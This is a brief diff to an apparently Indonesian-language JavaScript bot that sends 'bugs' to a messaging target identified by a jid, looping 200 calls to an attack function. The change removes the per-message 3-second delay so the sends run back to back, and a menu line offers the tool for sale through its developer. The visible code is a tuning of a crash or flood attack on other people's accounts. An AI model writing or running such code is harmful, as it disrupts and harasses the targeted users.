@@ -1212,7 +1212,6 @@ async function Delayinvis(target) {
 async function TrazKouta(target) {
   for (let i = 0; i < 200; i++) {
       await ExTraKouta(target);
-      await sleep(3000)
       console.log(chalk.red("Send Bug Succes"))
   }
 }
@@ -1545,6 +1544,7 @@ Silahkan beli ke Developer bot, contact Developer? tekan tombol Developer di baw
    
     console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
     await TrazKouta(jid);
+    await sleep(3000)
     console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
     
     
